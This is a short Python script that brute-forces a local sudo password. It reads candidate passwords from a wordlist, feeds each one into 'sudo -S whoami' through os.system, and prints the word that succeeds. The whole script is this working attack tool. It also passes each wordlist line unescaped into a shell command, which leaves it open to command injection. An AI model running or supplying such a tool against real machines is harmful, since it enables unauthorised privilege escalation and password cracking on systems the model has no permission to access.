import os
from time import time, clock

p = ''
n = 0
start = clock()

def run_command(line):
  ss = os.system('echo %s|sudo -S whoami &>/dev/null' % (line))
  return ss;  

with open('thinklist', 'r') as list:
  for line in list:
    n += 1
    if n % 20 == 0:
      t = (clock() - start) * 100
      print('%s words in %ss' % (n, t))
    line = line[:-1]
    p = run_command(line)
    print line
    if p == 0:
     print('p is %s' % line) 
     exit();
